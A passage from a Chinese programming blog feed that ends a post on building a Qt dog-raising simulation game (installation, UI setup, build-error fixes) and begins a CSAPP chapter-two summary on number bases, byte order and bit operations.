class="hljs-built_in">getPlayerTime</span>();<br>    Demo.<span class="hljs-built_in">setPlayerTime</span>(++x);<br>    <span class="hljs-built_in">InitialHome</span>();<br>    <span class="hljs-comment">//renovate();</span><br>    <span class="hljs-built_in">DogGrowing</span>();<br>    <span class="hljs-built_in">Initialchoose</span>();<br>&#125;<br><br><span class="hljs-comment">//停止定时器语句，插入在功能函数中</span><br> <span class="hljs-built_in">killTimer</span>(timerKiller);<br><span class="hljs-comment">//开启定时器语句</span><br>timerKiller=<span class="hljs-built_in">startTimer</span>(millisecondPerHour);<br></code></pre></td></tr></table></figure><h3 id="6-QT图形化界面部分"><a href="#6-QT图形化界面部分" class="headerlink" title="6.QT图形化界面部分"></a>6.QT图形化界面部分</h3><h4 id="6-1-QT环境准备"><a href="#6-1-QT环境准备" class="headerlink" title="6.1 QT环境准备"></a>6.1 QT环境准备</h4><blockquote><p>我们下载的这个程序就是QT Creator</p></blockquote><p>首先下载QT，下载链接：<a href="https://download.qt.io/">Index of &#x2F; (qt.io)</a>，选择 archive - qt&#x2F; </p><p>我选择了5.12.3版本，点击直接下载，还挺慢的🥲</p><p>下载之后运行</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-15-44.png"></p><p>next之后提示你登录，没有账号去注册一个就行，只需要填一个邮箱和密码就行。</p><blockquote><p>我看到的教程里都是直接跳过，但现在好像不行了</p></blockquote><p>接下来选择安装路径，我放在了D盘和运行程序在一个文件夹里</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-23-30.png"></p><p>选择需要的组件，全选的话占内存很大没必要，毕竟我们只是做个作业又不会用它做很多东西。</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-25-33.png"></p><p>这里要改成同意嗷👇🏼</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-29-48.png"></p><p>下一页忘记截图了就是安装桌面快捷方式，直接默认next就好。接下来就是等待安装啦，时间很长可以去跑个两公里。</p><p>有些教程上会讲到配置环境变量，因为我本来就有C++的编译环境就不需要辣</p><h5 id="土狗发言"><a href="#土狗发言" class="headerlink" title="土狗发言"></a>土狗发言</h5><p>Qt Creator是一个集成环境，它集成了Qt Designer，可以直接从Qt Creator中打开和编辑.ui文件。我们也可以搜索到Qt Designer运行程序并单独使用它。</p><p>我认为如果有双屏，再开一个Qt Designer单独编辑页面布局工作效率更高。</p><h4 id="6-2-QT边学边写"><a href="#6-2-QT边学边写" class="headerlink" title="6.2 QT边学边写"></a>6.2 QT边学边写</h4><p><strong>QT项目需求</strong></p><ul><li>游戏背景为一个房间内部的静态图片</li><li>鼠标悬停在家庭成员小狗身上时显示对应的家庭成员的信息</li><li>点击小狗家庭成员可以选择要进行的活动</li><li>页面侧边有几个选项可以选择对应的活动</li><li>页面顶部显示家庭信息</li></ul><h5 id="6-2-1-创建新项目"><a href="#6-2-1-创建新项目" class="headerlink" title="6.2.1 创建新项目"></a>6.2.1 创建新项目</h5><p>选择新建new project，choose第一个，设置构建路径后在类名选择部分选择widget，注意路径中不能有中文。</p><p>这个地方要把勾选取消👇🏼</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-27-02.png"></p><p>会直接生成框架，这时如果<code>ctrl+R</code>（编译并运行）会弹出一个空的小白框</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-28-34.png"></p><h5 id="6-2-2-主场景设置"><a href="#6-2-2-主场景设置" class="headerlink" title="6.2.2 主场景设置"></a>6.2.2 主场景设置</h5><p>新建一个头文件config.h，添加主场景信息</p><h6 id="窗口大小和标题设置"><a href="#窗口大小和标题设置" class="headerlink" title="窗口大小和标题设置"></a>窗口大小和标题设置</h6><p>对应图片信息设置相对应的界面信息，在这里我的图片有点小，所以我把对应数据都乘了2</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_13-57-38.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//游戏配置数据</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_WIDTH  1282  <span class="hljs-comment">//界面的宽度</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_HEIGHT 792   <span class="hljs-comment">//界面的高度</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_TITLE <span class="hljs-string">&quot;小狗撑起一个家&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_ICON <span class="hljs-string">&quot;:/img/favicon.ico&quot;</span> <span class="hljs-comment">//图标加载路径</span></span><br></code></pre></td></tr></table></figure><p>再在主头文件中添加相应语句，快捷键alt+enter在.cpp文件中添加定义</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_14-09-45.png"></p><p>对应的.cpp代码，记得在第一个函数中声明<code>initScene()</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//初始化界面配置</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MainWindow::initScene</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//设置窗口尺寸</span><br>    <span class="hljs-built_in">setFixedSize</span>(GAME_WIDTH,GAME_HEIGHT);<br><br>    <span class="hljs-comment">//设置标题</span><br>    <span class="hljs-built_in">setWindowTitle</span>(GAME_TITLE);<br><br>    <span class="hljs-comment">//加载图标</span><br>    <span class="hljs-built_in">setWindowIcon</span>(<span class="hljs-built_in">QIcon</span>(GAME_ICON));<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="背景和图标设置"><a href="#背景和图标设置" class="headerlink" title="背景和图标设置"></a>背景和图标设置</h6><p>在当前文件夹下新建文件，选择QT-resource</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_14-21-47.png"></p><p>右键单击文件打开，把图片素材都放进去</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_15-33-21.png"></p><blockquote><p>至此，我推翻重来。发现自己建文件的时候建成了mainwindows。🥲</p></blockquote><h6 id="UI界面"><a href="#UI界面" class="headerlink" title="UI界面"></a>UI界面</h6><p>使用容器Stacked Widget，会自动分页分为两个窗口。</p><p>初步计划将第一个窗口作为home页面即游戏主页面，第二个窗口作为商店页面</p><p>所有基础的游戏背景都是使用 photoshop 制作完成。</p><p>设置按钮后利用图形界面设置跳转</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-27_13-37-42.png"></p><p>选择released是点击松开后跳转。</p><p>在.cpp文件内设置响应代码使指针指向跳转页面</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-29_13-50-21.png"></p><p>页面利用 ps 直接制作相应非功能按钮部分减少工作量</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/%E8%B5%84%E6%BA%90.png"></p><h3 id="7-遇到的问题"><a href="#7-遇到的问题" class="headerlink" title="7.遇到的问题"></a>7.遇到的问题</h3><h4 id="7-1-C-代码"><a href="#7-1-C-代码" class="headerlink" title="7.1 C++代码"></a>7.1 C++代码</h4><h5 id="7-1-1-黑窗中文输出乱码"><a href="#7-1-1-黑窗中文输出乱码" class="headerlink" title="7.1.1 黑窗中文输出乱码"></a>7.1.1 黑窗中文输出乱码</h5><p>run code是正常的，但是黑框是乱码，据说二者不可兼得，就这样吧</p><p>哈哈没有解决方案🤪</p><h5 id="7-1-2-商店的实现"><a href="#7-1-2-商店的实现" class="headerlink" title="7.1.2 商店的实现"></a>7.1.2 商店的实现</h5><blockquote><p>最后发现我可以不用商店这个类，因为在游戏中的商店数据是静态的不会增加或减少，直接在main函数中设置即可，可以减少代码冗余量。</p></blockquote><p>前情提要：</p><p>如果直接设置商店类，无法实现商店中有多种可选择的商品。所以设想是先定义一个商品类，商品类中存储商品的名称和价格数据。再设置商店类，在商店类中存储商品的数组，并定义购物的函数。</p><p>那么如何实现在商店中存储商品数组呢？</p><p><code>vector&lt;Product&gt; products;</code>这句代码声明了一个名为<code>products</code>的变量，类型为<code>vector&lt;Product&gt;</code>。<code>vector</code>是C++标准库中的容器类之一，用于存储多个元素的动态数组。</p><p>需要配合头文件<code>#include&lt;vector&gt;</code>使用。</p><p>除此之外，有以下几种固定的函数使用规定：</p><p>对于 <code>vector</code> 容器，可以对数组进行动态调整、添加、删除和查找元素等操作：</p><ol><li><p>添加元素：使用 <code>push_back()</code> 函数将新元素添加到数组的末尾。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">push_back</span>(product);  <span class="hljs-comment">// 向数组末尾添加一个新元素</span><br></code></pre></td></tr></table></figure></li><li><p>删除元素：使用 <code>erase()</code> 函数删除指定位置或指定元素。</p><ul><li><p>删除指定位置的元素：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">erase</span>(products.<span class="hljs-built_in">begin</span>() + index);  <span class="hljs-comment">// 删除指定位置的元素，index 为元素的索引</span><br></code></pre></td></tr></table></figure></li><li><p>删除指定元素的所有匹配项：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">erase</span>(std::<span class="hljs-built_in">remove</span>(products.<span class="hljs-built_in">begin</span>(), products.<span class="hljs-built_in">end</span>(), product), products.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 删除指定元素的所有匹配项</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>查找元素：可以使用 <code>find()</code> 函数或遍历数组来查找指定元素。</p><ul><li><p>使用 <code>find()</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> it = std::<span class="hljs-built_in">find</span>(products.<span class="hljs-built_in">begin</span>(), products.<span class="hljs-built_in">end</span>(), product);  <span class="hljs-comment">// 在数组中查找指定元素，product 为要查找的元素</span><br><span class="hljs-keyword">if</span> (it != products.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-comment">// 元素找到</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 元素未找到</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>遍历数组：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : products) &#123;<br>    <span class="hljs-comment">// 对每个元素进行操作，item 为当前遍历到的元素</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h4 id="7-2-QT报错"><a href="#7-2-QT报错" class="headerlink" title="7.2 QT报错"></a>7.2 QT报错</h4><h5 id="7-2-1-qmake问题"><a href="#7-2-1-qmake问题" class="headerlink" title="7.2.1 qmake问题"></a>7.2.1 qmake问题</h5><p>Error while building&#x2F;deploying project ShortTerm (kit: Desktop Qt 5.12.3 MinGW 64-bit)</p><p>When executing step “qmake”</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-14-50.png"></p><p>问题原因就是构建目录不能放置在中文目录下，需要在英文目录里建立文件。</p><h5 id="7-2-2-图片载入报错"><a href="#7-2-2-图片载入报错" class="headerlink" title="7.2.2 图片载入报错"></a>7.2.2 图片载入报错</h5><p>error: No rule to make target ‘img&#x2F;???-1.png’, needed by ‘debug&#x2F;qrc_img.cpp’.  Stop.</p><p>发生在添加完资源后在QT界面为图片重命名的情况。</p><p>找到文件夹中的<code>.qmake.stash</code>，将其删除重新构建一次程序即可。 </p><h5 id="7-2-3-载入资源后图片不显示"><a href="#7-2-3-载入资源后图片不显示" class="headerlink" title="7.2.3 载入资源后图片不显示"></a>7.2.3 载入资源后图片不显示</h5><p>在添加完资源文件以后，要先<code>菜单栏-&gt;构建-&gt;qmake一下</code>，否则是无法显示的。</p><h5 id="7-2-4-卡死"><a href="#7-2-4-卡死" class="headerlink" title="7.2.4 卡死"></a>7.2.4 卡死</h5><p>新建一页page后设置样式表会卡死，没有正面解决方法，等一会再弄或者用Qt Designer单独配置ui。</p><p>嗷，还可以直接用代码设置样式表，不要用选项就不会卡。</p><p><del>别管了我精神失常了</del></p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-27_15-14-34.png"></p><h5 id="7-2-5-槽信号"><a href="#7-2-5-槽信号" class="headerlink" title="7.2.5 槽信号"></a>7.2.5 槽信号</h5><p>D:\software\QT\qt_project\PuppiesMakeAHome\debug\moc_shijx_widget.cpp:236: error: undefined reference to &#96;ShiJX_Widget::on_pushButton_gotostore_2_released()’</p><p>报错是因为错误地建立了一个槽信号，但是不想要了。</p><p>就只在.cpp文件中删除了对应的函数。</p><p>解决方法是在.h头文件中找到对应的声明删除，并将.cpp文件中的函数删除，最后重构项目。</p>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第二章 信息存储 总结</title>
    <link href="/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>计算机如何存储数据</p><span id="more"></span><h2 id="数字表示"><a href="#数字表示" class="headerlink" title="数字表示"></a>数字表示</h2><h4 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h4><p>二进制的英文简写为 bin ，用数字 1 和0 表示。</p><p>现代计算机存储和处理信息都用<strong>二进制</strong>表示，其原因是二值信号能够很容易地被表示、存储和传输。</p><p>对于人类，十进制刚好对应十个手指，所以我们采用十进制表示；而对于计算机，就像某一指示灯是否亮起、导线是否连通这样的表示，就只有 “是” 或 “否” 两种可能，正对应二进制0和1，所以在机算机中二进制值工作得更好。</p><h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>十六进制的英文简写为 hex ，使用数字 0 ~ 9 和字母 A ~ F 来表示。</p><p>在 C 语言中，我们通常用 <code>0x</code> 来作为辨别十六进制数字的标志。C语言中的十六进制数字<strong>大小写等效</strong>，比如二进制数字 FA1D37B 我们可以表示为 0xfa1d37b 也可以表示为 0XFA1D37B 甚至大小写混合 0xFa1D37b。</p><h4 id="不同进制之间的转换"><a href="#不同进制之间的转换" class="headerlink" title="不同进制之间的转换"></a>不同进制之间的转换</h4><p>我们二进制、十六进制与十进制转换方法就是权值相加或者是除基值取余，例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">10 = ( 2^0 *0 + 2^1 *1 + 2^2 *0 + 2^3 *1 ) -&gt; 1010 <br>100 = 16^1 *6 + 16^0 *4 -&gt; 0x64<br></code></pre></td></tr></table></figure><p>对于二进制和十六进制之间的转换，我们只需要将每一位十六进制数视作四位的二进制数，将每一位分别转换再组合出结果，例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">0x3c81e -&gt; 3 + c + 8 + 1 + e -&gt; 0011 1100 1000 0001 1110<br></code></pre></td></tr></table></figure><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="字节"><a href="#字节" class="headerlink" title="字节"></a>字节</h3><p>字节是计算机可寻址的最小单位，一个字节由 8 位二进制位组成。</p><blockquote><p>计算机只会去访问字节 8 位整体，而不会去访问内存中某个单独的位。</p></blockquote><p>但是因为二进制的表示过于冗长，我们在实际的表示中并不是使用二进制来描述位模式，所以我们会使用十六进制来表示位模式。八位的二进制就对应两位16进制的数。</p><h3 id="字数据大小"><a href="#字数据大小" class="headerlink" title="字数据大小"></a>字数据大小</h3><p>每台计算机都有一个字长，表明指针数据的标称大小，同时字长也是计算机 <code>CPU</code> 一次能处理的最大数据。</p><p>由字长决定的的系统参数是虚拟地址空间的最大大小。也就是说对于一个字长为 x 位的机器来说，虚拟地址的范围就是 0 ~ 2^x-1。由此，我们就知道为什么 32 位的计算机的内存为 4GB 也就是 2^32 字节了。</p><p>大多数 64 位的机器都可以运行 32 位机器编译的程序，我们常说的 32 位程序和 64 位程序的区别在于编译的方式而不是运行的机器类型。</p><p>计算机的不同数据所占字节的大小也不同，具体如下表：</p><table><thead><tr><th>C声明</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>8</td></tr><tr><td>int32_t</td><td>4</td><td>4</td></tr><tr><td>int64_t</td><td>8</td><td>8</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><blockquote><p>C语言中可以用 sizeof( ) 来返回某种类型数据的字节数</p></blockquote><p>由上表可知，只有指针类型的数据会随着机器字长发生变化。就是前面说的，机器字长决定了指针大小。</p><h3 id="寻址和字节顺序"><a href="#寻址和字节顺序" class="headerlink" title="寻址和字节顺序"></a>寻址和字节顺序</h3><p>跨越多字节的程序对象，我们需要确认两个规则：<strong>对象地址和字节的排列方法</strong>。</p><p>对于地址，在几乎所有的机器上，所字节对象都被存储为连续的字节序列，对象的地址就是<strong>所使用的字节中最小的地址</strong>。例如，一个四字节的 int 整数被储存在 0x100、0x101、0x102、x103 的位置，那么它的地址就是 0x100。</p><p>字节的排列表示方法有两个规则，分别为<strong>大端序</strong>和<strong>小端序</strong>。</p><p>以数据 0x12345678 为例，他的最高有效位是 12 ，最低有效位是 78。大端序的排列方式是最高有效位排列在最前面，小端序的排列方式是最低有效位排列在最前面。具体的对应关系如下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F.png"></p><p>由上图来看，大端序更符合人类平时的阅读习惯，但需要注意的是，大多数的 Intel 兼容机器使用的都是小端模式。我们在编写汇编语言时，也需要按照小端序的方式书写。</p><p>我们可以通过下面的函数来输出不同程序对象的字节表示，其中 <em>start</em> 为该对象的起始地址，<em>len</em> 为显示的字节数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们运行一下下面的例子来观察整形和浮点型数据的关系：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">0x00003039</span>;   <span class="hljs-comment">//十进制12345转换为十六进制3039</span><br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    <span class="hljs-type">float</span> y=x;<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">39 30 00 00 <br>00 e4 40 46<br></code></pre></td></tr></table></figure><p>可以看到虽然两种类型的数据都是对 12345 编码，但他们有不同的字节模式。浮点数的输出在整数形态下为 <code>0x4640E400</code>，与整数的存储有着截然不同的结果。</p><p>但是我们对这个结果的二进制适当移位，就会发现它们有13个相匹配的位。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>    <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">9</span><br><span class="hljs-attribute">000000000</span> <span class="hljs-number">0000000001000000111001</span><br>            <span class="hljs-attribute">4</span>   <span class="hljs-number">6</span>   <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   E    <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span><br>          <span class="hljs-attribute">0100011001000000111001</span> <span class="hljs-number">0000000000</span><br></code></pre></td></tr></table></figure><p>我们换其他的数据再次尝试就可以发现，匹配的总是 int 型的低位，但匹配位数不固定，float型的匹配部分也不是总是从最高位开始。</p><blockquote><p>原因是浮点数的尾数基本是和原二进制的值一致的，接下来浮点数部分会有相关原理解释</p></blockquote><h3 id="表示字符串"><a href="#表示字符串" class="headerlink" title="表示字符串"></a>表示字符串</h3><p>在C语言中，字符串被编码为以 NULL 结尾的字符数组，字符常用 ASCII 字符码编码表示。</p><p>字符串数组是以大端序储存的，比如我们存储一个字符串 <code>char s[] = &quot;12345&quot;</code>，那么实际上的存储顺序就是 <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=&#39;4&#39;,s[4]=&#39;5&#39;,s[5]=&#39;null&#39;</code>。需要注意，就算我们在编写存储字符串时并没有编写末尾的空字节，机器也会自动补充在字符串的末尾也就是最高位上。</p><p>空字节被包含在字符串当中，我们在限制字符串输入长度时需要注意防止溢出。</p><h3 id="表示代码"><a href="#表示代码" class="headerlink" title="表示代码"></a>表示代码</h3><p>不同机器类型使用不同且不兼容的指令和编码方式，二进制码是不兼容的。</p><p>从机器的角度来看，程序就仅仅是字节序列，不会有特定的信息来指示源程序。</p><h3 id="布尔代数简介"><a href="#布尔代数简介" class="headerlink" title="布尔代数简介"></a>布尔代数简介</h3><p>布尔代数是在二元集合 <code>&#123;0，1&#125;</code> 基础上的定义，在此基础上我们可以进行相关的运算。</p><ul><li><p>与</p><p>1与1为1，1与0为0，0与1为0，0与0为0</p></li><li><p>或</p><p>1或1为1，1或0为1，0或1为1，0或0为0</p></li><li><p>非</p><p>非0为1，非1为0</p></li><li><p>亦或</p><p>1异或1为0，1异或0为1，0异或1为1，0异或0为0</p></li></ul><h3 id="C语言中的运算"><a href="#C语言中的运算" class="headerlink" title="C语言中的运算"></a>C语言中的运算</h3><h4 id="位级运算"><a href="#位级运算" class="headerlink" title="位级运算"></a>位级运算</h4><p>C语言支持按位的布尔运算，每一位之间独立的进行运算。例如向量 <code>[a,b,…,c]</code> 和 <code>[A,B,…,C]</code> ，我们就可以把每一位元素拿出来单独进行运算，每一位结果为新向量对应位的结果。</p><p>在 C 语言中，以上逻辑运算对应的符号分别为：</p><ul><li>非：~</li><li>与：&amp;</li><li>或：|</li><li>异或：^</li></ul><h5 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h5><p>C 语言中我们用 bool 类型来表示逻辑运算结果，<code>true </code>表示 <code>真(1)</code>，<code>false </code> 表示 <code>假(0)</code> 。逻辑运算有单独的运算符：</p><ul><li><code>&amp;&amp;</code>（逻辑与）：如果两个操作数都为真，则结果为真；否则，结果为假。</li><li><code>||</code>（逻辑或）：如果至少有一个操作数为真，则结果为真；如果两个操作数都为假，则结果为假。</li><li><code>!</code>（逻辑非）：用于取反操作数的值，如果操作数为真，则取反后为假，如果操作数为假，则取反后为真。</li></ul><blockquote><p>bool 数据在进行运算时，会把所有参与运算的值转为 <code>bool</code> 类型，<code>0</code> 就是 <code>0</code>，不是 <code>0</code> 一律都是 <code>1</code>。</p></blockquote><h4 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h4><p>移位运算分为左移和右移，分别用符号 <code>&lt;&lt;</code> 和 <code>&gt;&gt;</code> 表示。</p><p>假设整数 <em>X</em> 一共 w 位，<code>X&gt;&gt;k</code> 右移 k 位表示丢弃低 k 位，原来的高 <code>w-k</code> 位变为低 <code>w-k</code> 位，高 <code>k</code> 位变为0。<code>X&lt;&lt;k</code> 左移 k 位表示丢弃高 k 位，原来的低 <code>w-k</code> 位变为高 <code>w-k</code> 位，低 <code>k</code> 位变为0。</p><p>其中右移运算又分为<strong>算术右移</strong>和<strong>逻辑右移</strong>。二者之间的差异就是高位填充值的不同，算术右移复制最高位，逻辑右移填充0。</p><p>由于算术右移的高位填充的是原本的最高位值而不是0，所以<strong>算术右移用于处理带符号整数，逻辑右移用于处理无符号整数</strong>。</p><h2 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h2><h3 id="整数数据类型"><a href="#整数数据类型" class="headerlink" title="整数数据类型"></a>整数数据类型</h3><p>C语言有多种不同的整数数据类型，用来表示不同范围的整数。每一种类型都可以用关键字来指定大小以及数字的正负。根据字节分配，不同的大小所能表示的值的范围不同，具体如下表：</p><blockquote><p>64位和32位只用long指示符的取值范围不同，括号内为32位对应的取值范围</p></blockquote><table><thead><tr><th>C数据类型</th><th>最小值</th><th>最大值</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned 